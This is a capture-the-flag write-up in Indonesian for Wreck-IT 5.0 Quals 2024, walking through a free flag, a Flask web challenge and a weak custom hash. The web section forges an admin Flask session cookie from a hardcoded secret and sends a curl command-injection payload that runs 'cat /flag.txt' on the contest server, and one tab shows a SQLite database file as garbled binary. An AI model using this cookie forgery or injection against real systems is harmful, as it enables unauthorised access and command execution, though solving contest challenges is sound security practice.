---
description: >-
  Wreck-IT is a CTF event hosted by the National Cyber and Crypto Polytechnic
  (PSSN). For the quals, the format of CTF is jeopardy-style and held online.
icon: binary-lock
cover: >-
  https://images.unsplash.com/photo-1614064641938-3bbee52942c7?crop=entropy&cs=srgb&fm=jpg&ixid=M3wxOTcwMjR8MHwxfHNlYXJjaHw5fHxjeWJlcnxlbnwwfHx8fDE3NDE4MjA4MjF8MA&ixlib=rb-4.0.3&q=85
coverY: 0
---

# Wreck-IT 5.0 Quals 2024

## Free Flag (Misc - Very Easy)

### 1. Deskripsi

> WRECKIT50{just\_ch3cking\_f0r\_y0ur\_sani7y}

### 2. Langkah Penyelesaian

* Flag gratis untuk permulaan dan sudah tertera di challenge description. Jadi, tinggal masukan saja flagnya.

### 3. Flag

<kbd>WRECKIT50{just\_ch3cking\_f0r\_y0ur\_sani7y}</kbd>

## Oshiku (Web - Moderate)

### 1. Deskripsi

> Challenge Sederhana. iya kan?
>
> 137.184.250.54:7012
>
> mirror : 146.190.104.208:7012
>
> **Author**: ZeroEXP

### 2. Langkah Penyelesaian

* Diberikan sebuah file `dist.rar`, yang setelah diekstrak muncul 2 file berupa aplikasi Flask: `app.py` & `database.db` . Berikut adalah source code ke-2 file tersebut.

{% tabs %}
{% tab title="app.py" %}
```python
from flask import *
import sqlite3
import os
import subprocess

app = Flask(__name__)
app.secret_key = 'os.urandom(8)'

# Database connection
DATABASE = "database.db"
def query_database(name):
    query = 'sqlite3 database.db "SELECT biography FROM oshi WHERE name=\'' + str(name) +'\'\"'
    result = subprocess.check_output(query, shell=True, text=True)
    return result

@app.route("/")
def index():
    role = session.get('role')
    if role == "admin":
        return redirect(url_for('admin'))
    elif role == "guest":
        return redirect(url_for('guest'))
    else:
        return redirect(url_for('login'))

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        if username == "guest" and password == "guest":
            session['username'] = username
            session['role'] = "guest"
            return redirect(url_for('guest'))
        else:
            return jsonify({"msg": "Bad username or password"}), 401
    return render_template("login.html")

@app.route("/admin", methods=["GET", "POST"])
def admin():
    if 'role' not in session or session['role'] != "admin":
        return jsonify({"msg": "Access forbidden: Admins only"}), 403

    if request.method == "POST":
        selected_name = request.form.get("oshi_name")
        biography = query_database(selected_name)
        return render_template("admin.html", biography=biography)
    return render_template("admin.html", biography="")

@app.route("/guest", methods=["GET", "POST"])
def guest():
    if 'role' not in session or session['role'] != "guest":
        return jsonify({"msg": "Access forbidden: Guests only"}), 403
    return render_template("guest.html")

@app.route("/logout")
def logout():
    session.pop('username', None)
    session.pop('role', None)
    return redirect(url_for('login'))

if __name__ == "__main__":
    app.run(debug=False,host='0.0.0.0')
```
{% endtab %}

{% tab title="database.py" %}
```python
��g''�ormat 3t]''wtablecyberIwtableoshioshiCREATE TABLE "oshi" (
"name" TEXT,
"biography" TEXT
)��
SG����
�@     #�oGraceHopperGrace Brewster Hopper (née Murray; December 9, 1906 – January 1, 1992) was an American computer scientist, mathematician, and United States Navy rear admiral.[1] One of the first programmers of the Harvard Mark I computer, she was a pioneer of computer programming who invented one of the first linkers. Hopper was the first to devise the theory of machine-independent programming languages, and the FLOW-MATIC programming language she created using this theory was later extended to create COBOL, an early high-level programming language still in use today.�#�=MaddieStoneMaddie Stone is a prominent researcher on Google’s Project Zero bug-hunting team, which finds critical software flaws and vulnerabilities—mostly in other companies’ products. But her journey through the ranks of the security research community hasn’t always been easy, and has galvanized her to speak openly, often on Twitter, about the need to make the tech and engineering industries more inclusive�3)�ODorothyVaughanDorothy Jean Johnson Vaughan (September 20, 1910 – November 10, 2008) was an American mathematician and human computer who worked for the National Advisory Committee for Aeronautics (NACA), and NASA, at Langley Research Center in Hampton, Virginia. In 1949, she became acting supervisor of the West Area Computers, the first African-American woman to receive a promotion and supervise a group of staff at the center�       !�LenoreBlumLenore Carol Blum (née Epstein born December 18, 1942) is an American computer scientist and mathematician who has made contributions to the theories of real number computation, cryptography, and pseudorandom number generation. She was a distinguished career professor of computer science at Carnegie Mellon University until 2019 and is currently a professor in residence at the University of California, Berkeley. She is also known for her efforts to increase diversity in mathematics and computer science�+/�9StephanieDorotheaStephanie Dorothea Christine Wehner (born 8 May 1977 in Würzburg) is a German physicist and computer scientist. She is the Roadmap Leader of the Quantum Internet and Networked Computing initiative at QuTech, Delft University of Technology.She is also known for introducing the noisy-storage model in quantum cryptography. Wehner's research focuses mainly on quantum cryptography and quantum communications�J-�yMargaretHamiltonMargaret Elaine Hamilton (née Heafield; born August 17, 1936) is an American computer scientist, systems engineer, and business owner. She was director of the Software Engineering Division of the MIT Instrumentation Laboratory, which developed on-board flight software for NASA's Apollo program. She later founded two software companies—Higher Order Software in 1976 and Hamilton Technologies in 1986, both in Cambridge, Massachusetts.�'�arbaraLiskovBarbara Liskov (born November 7, 1939 as Barbara Jane Huberman) is an American computer scientist who has made pioneering contributions to programming languages and distributed computing. Her notable work includes the development of the Liskov substitution principle which describes the fundamental nature of data abstraction, and is used in type theory (see subtyping) and in object-oriented programming (see inheritance). Her work was recognized with the 2008 Turing Award, the highest distinction in computer science�0#�OGraceHopperGrace Brewster Hopper (née Murray; December 9, 1906 – January 1, 1992) was an American computer scientist, mathematician, and United States Navy rear admiral.�a#�1AdaLovelaceAugusta Ada King, Countess of Lovelace (née Byron; 10 December 1815 – 27 November 1852) was an English mathematician and writer, chiefly known for her work on Ch�@��age's proposed mechanical general-purpose computer, the Analytical Engine. She was the first to recognise that the machine had applications beyond pure calcula
          �
           �    =C���#�oGraceHopperGrace Brewster Hopper (née Murray; December 9, 1906 – Januar'��ograciaGrace Brewster Hopper (née Murray; December 9, 1906 – January 1, 1992) was an American computer scientist, mathematician, and United States Navy rear admiral.[1] One of the first programmers of the Harvard Mark I computer, she was a pioneer of computer programming who invented one of the first linkers. Hopper was the first to devise the theory of machine-independent programming languages, and the FLOW-MATIC programming language she created using this theory was later extended to create COBOL, an early high-level programming language still in use today.'��1freyaAugusta Ada King, Countess of Lovelace (née Byron; 10 December 1815 – 27 November 1852) was an English mathematician and writer, {�sadelReva Fidela is a member of JKT48. She is also a member of Valkyrie48. She announced her graduation on June 6, 2024.�L�freyaRaden Roro Freyanashifa Jayawardana (lahir 13 Februari 2006), yang dikenal secara profesional sebagai Freya Jayawardana dan dengan nama panggung Freya, adalah seorang penyanyi dan penari asal Indonesia. Ia merupakan anggota generasi ketujuh dari grup idola JKT48 yang diperkenalkan pada tahun 2018. Freya diwakili oleh IDN.��#indiraIndira artinya cantik, Putri artinya anak perempuan, Seruni itu nama bunga. Kalo digabung artinya jadi anak perempuan secantik bunga seruniOchristyDorothy Jean J�w  �ggraciaGracia bergabung dengan JKT48 pada tahun 2014 saat berusia 14 tahun sebagai anggota generasi ketiga, dan setelah dipromosikan ke tim T pada 2015 serta ditransfer ke tim KIII pada 2016, ia sempat menjadi kapten tim KIII. Setelah restrukturisasi, ia bergabung dengan JKT48 New Era pada 2021 dan kini menjadi salah satu anggota paling senior. Di luar kariernya sebagai idol, Gracia adalah sarjana Ilmu Komunikasi dan mulai menunjukkan bakat aktingnya dengan peran dalam film "Dilan 1991" dan FTV "Dede Gemes Mentiktok Hatiku," serta akan berperan dalam film "Ancika 1995." Sebagai anak pertama dari tiga bersaudara, ia memiliki dua adik laki-laki, Stanlie Thiodorus dan Jason Jonathan, dan sering menunjukkan kedekatannya dengan mereka di media sosial.�X'christyChristy, yang dikenal dengan nama panggilan Toya, bergabung dengan JKT48 sebagai trainee sejak berusia 12 tahun pada tahun 2018, tepat setelah lulus dari sekolah dasar (SD). Kini, setelah lima tahun berkarier bersama JKT48 dan lulus SMA, Christy telah menjadi salah satu anggota yang paling populer di grup tersebut. Para penggemar Christy, yang menyebut diri mereka "Christyzer," sangat mendukung dan mengagumi karyanya. Nama panggilan "Toya" diketahui berasal dari Shania Gracia, yang akrab disapa Cigre, dan kini telah melekat pada Christy serta sering digunakan oleh para penggemarnya.�)�MonielOniel, yang memiliki nama lengkap Cornelia Syafa Vanisa, adalah anak bungsu dari dua bersaudara dengan seorang kakak laki-laki. Orangtuanya memiliki kedekatan dengan dunia seni, di mana ibunya adalah seorang penari tarian tradisional, sedangkan ayahnya memiliki keahlian dalam olah vokal.�I�luluLulu Salsabila, yang memiliki nama lengkap Lulu Azkiya Salsabila, lahir di Serang pada 23 Oktober 2002 dan saat ini berusia 21 tahun. Ia adalah seorang penyanyi Indonesia dan anggota JKT48 yang berasal dari Jakarta. Lulu bergabung dengan JKT48 sebagai bagian dari generasi kedelapan yang diperkenalkan pada 27 April 2019.�m�UfionySeorang gadis yang bernama lengkap Fiony Alveria Tantri lahir pada 4 Februari 2002 ini merupakan seorang member JKT48 generasi 8.Pertama kali diperkenalkan pada 27 April 2019 tepatnya di event JKT48 Request Hour 2019. Masuk sebagai siswi Academy Class B dan ia pun berhasil menjadi siswi Academy Class A pada 30 Juni 2019. Selama di Academy Fiony ikut serta dalam setlist Pajama Drive dan Boku no Taiyou dan juga tampil sebagai backdancer pada setlist Saka Agari dan Fajar Sang Idola.
A��*
     greeselGreesel memulai kariernya di dunia hiburan sebagai model dan meraih kemenangan dalam beberapa ajang pada tahun 2016, termasuk Citruskid Top Model, Plangi Model Hunt, dan GMS Kids. Pada tahun 2018, ia membuat debut aktingnya dengan memerankan masa kecil tokoh Kinara dalam film "Dancing in the Rain." Pada 31 Oktober 2022, Greesel diperkenalkan sebagai salah satu anggota JKT48 generasi sebelas dalam pertunjukan Halloween Event di Teater JKT48, dan ditetapkan sebagai siswi pelatihan. Kemudian, pada 17 Desember 2023, melalui konser ulang tahun JKT48 yang ke-12, Greesel diumumkan sebagai anggota tetap yang akan mulai aktif pada 1 Februari 2024.�D
�indahElla, anggota JKT48 Generasi 10 yang debut pada 18 Desember 2021, memiliki hobi traveling, menonton film, makan camilan, dan memasak. Dia mengagumi Shani Indira Natio dan dikenal dengan perkenalan uniknya, "Ohayo! Konnichiwa! Aku ingin ada di setiap harimu." Kelebihannya meliputi kemampuan empati dan memahami perasaan orang lain, sedangkan kelemahannya adalah mudah merasa sedih dan khawatir. Ella menyukai kata "Fighters get what they want," dan bercita-cita menjadi idol serta pengusaha. Makanan favoritnya adalah jagung manis dengan susu dan keju serta durian, sedangkan makanan yang tidak disukainya adalah seblak, hati ayam, dan kerang. Warna favoritnya adalah pink, dan dia ingin menguasai bahasa Korea dan Jepang. Mata pelajaran sekolah favoritnya adalah Bahasa, dan dia suka menghabiskan waktu di museum. Kucing adalah hewan favoritnya. Ella adalah anggota tertua di generasi ke-9 JKT48 yang lahir setelah tahun 2000. Dia lulus ujian Akademi Kelas B tahap 1 pada 23 Januari 2020 dan tahap 2 pada 25 Januari 2020, yang membuatnya dipromosikan ke Kelas A. Saat ini, dia sedang belajar Pendidikan Bahasa Inggris di Universitas Negeri Jakarta (UNJ) dan mengungkapkan keterkaitannya dengan universitas tersebut saat acara Ramadan khusus JKT48, "The Slap Show," pada 2023. Ella dekat dengan Adzana Shaliha, Kathrina Irene, Marsha Lenathea, Gita Sekar Andarini, dan Cornelia Vanisa. Dia adalah anak tengah dari tiga bersaudara, dengan seorang kakak perempuan yang adalah seorang dokter dan adik laki-laki. Kakaknya mengreeselp��]ellaRadia Joy Perlman (/ˈreɪdiə/;[1] born December 18, 1951) is an American computer programmer and network engineer. She is a major figure in assembling the networks and technology to enable what we now know as the internet. She is most famous for her invention of the spanning-tree protocol (STP), which is fundamental to the operation of network bridges, while working for Digital Equipment Corporation, thus earning her nickname "Mother o�,
                                                                                                                     �UellaElla adalah salah satu anggota JKT48 dari Generasi 10, yang memulai debutnya pada 18 Desember 2021 bersama tujuh member lainnya. Ella dikenal dengan perkenalan uniknya, yaitu "Ohayo! Konnichiwa! Aku ingin ada di setiap harimu," yang banyak dianggap sangat membakar semangat para penggemarnya.��indahSusan Landau (born 1954) is an American mathematician, engineer, cybersecurity policy expert, and Bridge Professor in Cybersecurity and Policy at the Fletcher School of Law and Diplomacy at Tufts University. She previously worked as a Senior Staff Privacy Analyst at Google. She was a Guggenheim Fellow and a visiting scholar at the Computer Science Department, Harvard University in 2012
```
{% endtab %}
{% endtabs %}

* Awal saya analisis file app.py, saya menyadari bahwa secret\_key yang digunakan adalah berupa string biasa / tidak random (_weak secret key_). Dari situ, saya langsung craft python script untuk men-generate sebuah JWT token agar bisa login sebagai admin dengan memanfaatkan **role=”admin”**. Berikut adalah kodenya.

{% code title="gen_session_cookie.py" overflow="wrap" lineNumbers="true" %}
```python
# GENERATE ADMIN SESSION COOKIE USING WEAK SECRET KEY!
from flask.sessions import SecureCookieSessionInterface
from itsdangerous import URLSafeTimedSerializer
import requests

# Fungsi untuk membuat sesi palsu
def create_session(secret_key, data):
    session_interface = SecureCookieSessionInterface()
    serializer = URLSafeTimedSerializer(
        secret_key,
        salt='cookie-session',
        signer_kwargs={'key_derivation': 'hmac', 'digest_method': 'sha1'}
    )
    return serializer.dumps(data)

# URL target
url = "http://146.190.104.208:7012"

# Buat sesi palsu
secret_key = 'os.urandom(8)'
session_data = {'role': 'admin'}
fake_session = create_session(secret_key, session_data)
print(fake_session)
```
{% endcode %}

<figure><img src=".gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

* Setelah berhasil login sebagai admin, saya coba baca lagi source code flask-nya. Awalnya, saya berpikir jika di fungsi `query_database` adalah kerentanan _SQL Injection_, tapi ternyata saya salah. Itu merupakan kerentanan _**Command Injection**_. Langsung saja saya craft payloadnya dan coba kirim request tersebut via cURL menggunakan cookie admin yang sudah di-generate sebelumnya.
* Berikut adalah POC untuk get flag-nya:

{% code title="solver.sh" %}
```bash
curl -X POST -d "oshi_name=freya\"; cat /flag.txt; echo #" --cookie "session=eyJyb2xlIjoiYWRtaW4ifQ.ZrbXaQ.9CjlFr995lsT5RjKbe9D_6t4kMg" http://146.190.104.208:7012/admin
```
{% endcode %}

<figure><img src=".gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

### 3. Flag

<kbd>WRECKIT50{oshikucumansatukok\_satujkt}</kbd>

## m4k c0MbL4n6 (Crypto - Very Easy)

### 1. Deskripsi

> aku lagi jomblo. tolong carikan aku jodoh
>
> Thanks to hash designer & attacker: @hakim01a (IG) & @yudik\_suta (IG)
>
> Connected to : nc 188.166.247.108 6969
>
> alt: nc 13.212.238.29 6969
>
> Author : ac3

### 2. Langkah Penyelesaian

* Diberikan 2 file, yaitu `propietary.py` dan `chall.py` .&#x20;

{% tabs %}
{% tab title="propietary.py" %}
```python
import math

def biner_ke_hex(biner):
    desimal = int(biner, 2)
    heksadesimal = hex(desimal)
    return heksadesimal[2:]

def float_bin(my_number, places=3):
    my_whole, my_dec = str(my_number).split(".")
    my_whole = int(my_whole)
    res = (str(bin(my_whole))+".").replace('0b','')

    for x in range(places):
        my_dec = str('0.')+str(my_dec)
        temp = '%1.20f' %(float(my_dec)*2)
        my_whole, my_dec = temp.split(".")
        res += my_whole
    return res

def cyclic_left_shift(value, shift):
    return ((value << shift) & 0xFFFFFFFF) | (value >> (32 - shift))

def binary32(n):
    sign = 0
    if n < 0:
        sign = 1
        n = n * (-1)
    p = 30
    dec = float_bin(n, places=p)

    dotPlace = dec.find('.')
    onePlace = dec.find('1')
    if onePlace > dotPlace:
        dec = dec.replace(".","")
        onePlace -= 1
        dotPlace -= 1
    elif onePlace < dotPlace:
        dec = dec.replace(".","")
        dotPlace -= 1
    mantissa = dec[onePlace+1:]

    exponent = dotPlace - onePlace
    exponent_bits = exponent + 127
    exponent_bits = bin(exponent_bits).replace("0b",'')
    mantissa = mantissa[0:23]

    final = str(sign) + exponent_bits.zfill(8) + mantissa
    return final

def parse_input(x):
    if len(x) != 32:
        raise ValueError("Input harus 32-bit string")

    xl = x[:12]
    xm = x[12:28]
    xr = x[28:]

    return xl, xm, xr

def calculate_parameters(xl, xm, xr):
    gama_awal = int(xl, 2) * (1 / 2**12)
    eta = (int(xm, 2) * (2 / 2**16)) + 2
    k = (int(xr, 2) * (1 / 2**4)) + 10.01
    n = math.floor(6 * gama_awal)

    return gama_awal, eta, k, n

def fL(eta, gama_n):
    return eta * gama_n * (1 - gama_n)

def gamma_function(gama_awal, eta, k, n, i):
    gama = gama_awal
    for i in range(n + i):
        gama = (2**k / 2**fL(eta, gama)) % 1
    return gama

def ELM(x):
    xl, xm, xr = parse_input(x)
    gama_awal, eta, k, n = calculate_parameters(xl, xm, xr)
    gama_n1 = gamma_function(gama_awal, eta, k, n, 1)
    gama_n2 = gamma_function(gama_awal, eta, k, n, 2)

    w1 = binary32(gama_n1 * (10**(10)))
    w2 = binary32(gama_n2)
    y = (cyclic_left_shift(int(w1,2), 17)) ^ (int(w2,2))
    return format(y, '032b')

def transform_f(x):
    blocks = [x[i:i+32] for i in range(0, 256, 32)]

    x_prev = '0' * 32
    for i in range(8):
        x_curr = blocks[i]
        blocks[i] = ELM(format(int(x_curr, 2) ^ int(x_prev, 2),'032b'))
        x_prev = blocks[i]

    blocks[0] = format((cyclic_left_shift(int(blocks[0], 2), 19) + (cyclic_left_shift(int(blocks[2], 2), 9) % (2**32))), '032b')
    blocks[4] = format(cyclic_left_shift(int(blocks[4], 2) ^ cyclic_left_shift(int(blocks[2], 2), 9), 7), '032b')
    blocks[5] = format(cyclic_left_shift(int(blocks[5], 2) ^ cyclic_left_shift(int(blocks[3], 2), 17), 13), '032b')
    blocks[6] = format((int(blocks[6], 2) + int(blocks[4], 2)) % (2**32), '032b')
    blocks[7] = format(cyclic_left_shift(int(blocks[7], 2), 11) ^ int(blocks[5], 2), '032b')
    blocks[1] = format(int(blocks[1], 2) + int(blocks[5], 2), '032b')
    blocks[2] = format(cyclic_left_shift(int(blocks[2], 2), 9) ^ int(blocks[6], 2), '032b')
    blocks[3] = format((cyclic_left_shift(int(blocks[3], 2), 17) + int(blocks[1], 2)) % (2**32), '032b')

    return ''.join(blocks)

def convert_to_32bit_hex(input_hex):
    input_int = int(input_hex[:8], 16)  # Ambil 8 digit pertama jika lebih panjang dari 8 digit
    bit_string = format(input_int, '032b')  # Konversi integer ke 32 bit biner dengan leading zeros

    return bit_string

# Fungsi hash HORTEX
def HORTEX(input_hex):
    X_bin = convert_to_32bit_hex(input_hex)
    pad_len = (64 - (len(X_bin) % 64)) % 64
    X_padded = X_bin + '1' + '0' * (pad_len - 1)

    r, c = 64, 192
    state = '0' * (r + c)

    state_int = int(state[:r], 2)
    block_int = int(X_padded, 2)
    updated_state = format(state_int ^ block_int, '064b') + '0'*c
    after_abs = transform_f(updated_state)

    s0 = transform_f(after_abs)
    h1 = s0[:r]
    state = transform_f(s0)
    h2 = state[:r]

    h1_hex = format(int(h1, 2), '016x')
    h2_hex = format(int(h2, 2), '016x')
    return h1_hex + h2_hex
```
{% endtab %}

{% tab title="chall.py" %}
```python
from propietary import *
def print_diagram():
    diagram = """
    Sistem Penjodohan oleh Mak Comblang. Semoga cocok :)
    """

    print(diagram)

if __name__ == "__main__":
    print_diagram()

while True:
        X_hex = input('choose your man (hex): ')
        Y_hex = input('choose your woman (hex): ')

        hash_value1 = HORTEX(X_hex)
        hash_value2 = HORTEX(Y_hex)

        if hash_value1 == hash_value2 and X_hex != Y_hex:
                print("New couple is matched :). Here your flag WRECKIT50{REDACTED}")
                break
        else:
                print("Try again")
                break
```
{% endtab %}
{% endtabs %}

* Setelah menganalisis kedua file tersebut, saya menemukan kerentanan potensial dalam implementasi fungsi hash `HORTEX` .
* Fungsi HORTEX hanya mengambil **8 digit pertama** dari input hex (32 bit).
* Padding dilakukan setelah konversi ke biner, yang berarti input yang berbeda bisa menghasilkan hash yang sama jika 8 digit pertamanya sama.
* Kemudian, saya membuat dua inputan (X dan Y) yang berbeda tapi dengan 8 digit awalnya sama, sisanya tinggal dibedakan. Tanpa ambil pusing, saya langsung membuatnya seperti ini.
  * X\_hex = "**12345678aaaaaaaa**"
  * Y\_hex = "**12345678bbbbbbbb**"
* Karena X\_hex dan Y\_hex berbeda (**syarat X\_hex != Y\_hex terpenuhi**), maka program akan menampilkan flag.

<figure><img src=".gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>

### 3. Flag

<kbd>WRECKIT50{fUnCt10n\_Sh0uLd\_nOt\_13Ij3cT1On}</kbd>

***

**Tags**: #ctf, #web-exploitation, #cryptography
